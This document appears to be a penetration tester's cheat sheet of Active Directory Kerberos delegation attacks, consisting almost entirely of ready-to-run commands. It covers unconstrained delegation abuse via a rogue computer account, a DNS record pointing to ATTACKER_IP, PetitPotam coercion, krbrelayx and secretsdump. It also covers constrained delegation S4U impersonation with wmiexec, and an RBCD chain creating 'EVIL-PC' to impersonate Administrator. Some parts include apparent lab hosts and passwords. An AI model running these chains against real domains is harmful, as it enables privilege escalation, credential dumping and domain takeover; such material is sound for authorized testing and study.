# Delegation

## 2. Unconstrained Delegation

### 2.2 Enumeration

```powershell
Import-Module .\PowerView.ps1

# PowerView
Get-DomainComputer -Unconstrained | Select-Object samaccountname, distinguishedname
Get-DomainUser -Unconstrained | Select-Object samaccountname, distinguishedname

# Native AD module
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation, dNSHostName
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

whoami /all
SeEnableDelegationPrivilege
```

### 2.4 Attack Chain

```powershell
# [1] Add computer account
impacket-addcomputer -dc-ip <DC_IP> -computer-name <COMP_NAME> <DOMAIN>/<USER>:'<PASS>'

# [2] Enable Unconstrained Delegation
bloodyAD -u '<USER>' -d <DOMAIN> -p '<PASS>' --host <DC_IP> add uac '<COMP_NAME>$' -f TRUSTED_FOR_DELEGATION

# [3] Add DNS A record
python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASS>' -r <COMP_NAME>.<DOMAIN> -d <DC_IP> --action add <ATTACKER_IP>

# [4] Add SPN
python3 addspn.py -u '<DOMAIN>\<USER>' -p '<PASS>' -s 'cifs/<COMP_NAME>' -t '<COMP_NAME>$' -dc-ip <DC_IP> <DC_IP>

# [5] Verify SPN
bloodyAD -d <DOMAIN> --dc-ip <DC_IP> -u '<USER>' -p '<PASS>' get object '<COMP_NAME>$' --attr 'servicePrincipalName'

# [6] Verify DNS
dig <COMP_NAME>.<DOMAIN> @<DC_IP>

# [7] Calculate NT Hash
python3 -c "import hashlib,binascii; print(binascii.hexlify(hashlib.new('md4','<COMP_PASS>'.encode('utf-16-le')).digest()).decode())"

# [8] Start krbrelayx (separate terminal)
python3 krbrelayx.py -hashes :<NT_HASH> -aesKey <AES256>

# [9] Trigger PetitPotam (separate terminal)
python3 PetitPotam.py -target-ip <DC_IP> -u '<COMP_NAME>$' -p '<COMP_PASS>' <COMP_NAME> dc1.<DOMAIN>

# [10] Dump secrets with captured TGT
KRB5CCNAME=DC1\$@<DOMAIN_UPPER>_krbtgt@<DOMAIN_UPPER>.ccache \
impacket-secretsdump -just-dc-user Administrator -k dc1.<DOMAIN>
```

---

## 3. Constrained Delegation with Protocol Transition (S4U2Self + S4U2Proxy)

```
python3 /home/sako/Tools/Impacket/examples/getTGT.py redelegate.vl/'FS01$':'sako2005!' -dc-ip 10.129.30.71
export KRB5CCNAME=FS01\$.ccache
klist

python3 /home/sako/Tools/bloodyAD/bloodyAD.py -d redelegate.vl -u helen.frost -p 'sako2005!' --host dc.redelegate.vl add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION

python3 /home/sako/Tools/bloodyAD/bloodyAD.py -d redelegate.vl -u helen.frost -p 'sako2005!' --host dc.redelegate.vl set object 'FS01$' msDS-AllowedToDelegateTo -v 'cifs/dc.redelegate.vl' -v 'ldap/dc.redelegate.vl'

python3 /home/sako/Tools/bloodyAD/bloodyAD.py -d redelegate.vl -u helen.frost -p 'sako2005!' --host dc.redelegate.vl get object 'FS01$' --attr msDS-AllowedToDelegateTo
python3 /home/sako/Tools/bloodyAD/bloodyAD.py -d redelegate.vl -u helen.frost -p 'sako2005!' --host dc.redelegate.vl get object RYAN.COOPER --attr userAccountControl

python3 /home/sako/Tools/Impacket/examples/getST.py -spn cifs/dc.redelegate.vl -impersonate ryan.cooper redelegate.vl/'FS01$':'sako2005!' -dc-ip 10.129.30.71

export KRB5CCNAME=ryan.cooper.ccache
python3 /home/sako/Tools/Impacket/examples/wmiexec.py -k -no-pass dc.redelegate.vl
```

---

## 4. Constrained Delegation without Protocol Transition (Use Kerberos only)

### 4.2 Enumeration

```powershell
Import-Module .\PowerView.ps1

# PowerView - accounts with delegation targets but NOT Protocol Transition
Get-DomainUser -AllowDelegation | Where-Object { $_.useraccountcontrol -notmatch "TRUSTED_TO_AUTH_FOR_DELEGATION" } | `
    Select-Object samaccountname, msds-allowedtodelegateto

# Native AD module
Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*" -and TrustedToAuthForDelegation -eq $false} `
    -Properties msDS-AllowedToDelegateTo, TrustedToAuthForDelegation, ServicePrincipalName
```

### 4.4 Observing the Restriction

```powershell
# Obtain the NTLM hash
.\Rubeus.exe hash /password:sako2005! /user:constrained-svc /domain:warzone.oxsium.local

# Attempting to impersonate Administrator will fail at S4U2Proxy
# because the S4U2Self ticket is not forwardable
.\Rubeus.exe s4u /user:constrained-svc /rc4:BURAYA_RC4_HASH `
    /impersonateuser:Administrator `
    /msdsspn:CIFS/WIN-WARZONE.warzone.oxsium.local `
    /ptt
```

---

## 5. Resource-Based Constrained Delegation (RBCD)

### 5.2 Enumeration

```powershell
Import-Module .\PowerView.ps1

# PowerView - find objects with RBCD already configured
Get-DomainComputer -Properties name, msds-allowedtoactonbehalfofotheridentity | `
    Where-Object { $_.'msds-allowedtoactonbehalfofotheridentity' }

# Native AD module
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | `
    Where-Object { $_.'msDS-AllowedToActOnBehalfOfOtherIdentity' }

# Check the current user's MachineAccountQuota (how many computer objects they can create)
Get-ADObject (Get-ADDomain).DistinguishedName -Properties ms-DS-MachineAccountQuota

# Find objects where a controlled principal has GenericAll/GenericWrite (BloodHound covers this more thoroughly)
Get-DomainObjectAcl -Identity "RBCD-PC" -ResolveGUIDs | `
    Where-Object { $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty" }
```

### 5.4 Attack Chain — Attacker-Controlled Object

```powershell
Import-Module .\PowerView.ps1

# 1. Create an attacker-controlled computer account (run as lowpriv-user to simulate the real scenario)
$ComputerName = "EVIL-PC"
$Password = ConvertTo-SecureString "Ev1lP@ss123!" -AsPlainText -Force

New-ADComputer -Name $ComputerName -SAMAccountName "$ComputerName`$" `
    -AccountPassword $Password -Enabled $true `
    -Path "OU=Delegation,DC=warzone,DC=oxsium,DC=local"

# 2. Resolve EVIL-PC$'s SID
$evilSID = Convert-NameToSid EVIL-PC$

# 3. Point RBCD-PC's msDS-AllowedToActOnBehalfOfOtherIdentity at EVIL-PC$
Set-ADComputer -Identity "RBCD-PC" -PrincipalsAllowedToDelegateToAccount "EVIL-PC$"

# 4. Verify
$rbcd = Get-ADComputer -Identity "RBCD-PC" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
$rbcd.'msDS-AllowedToActOnBehalfOfOtherIdentity'.Access

# 5. Convert EVIL-PC$'s password to an NTLM hash
.\Rubeus.exe hash /password:Ev1lP@ss123! /user:EVIL-PC$ /domain:warzone.oxsium.local

# 6. Full S4U chain: impersonate Administrator against RBCD-PC's CIFS service
.\Rubeus.exe s4u /user:EVIL-PC$ /rc4:BURAYA_RC4_HASH `
    /impersonateuser:Administrator `
    /msdsspn:CIFS/RBCD-PC.warzone.oxsium.local `
    /domain:warzone.oxsium.local `
    /ptt

# 7. Verify access
klist
ls \\RBCD-PC.warzone.oxsium.local\C$
```
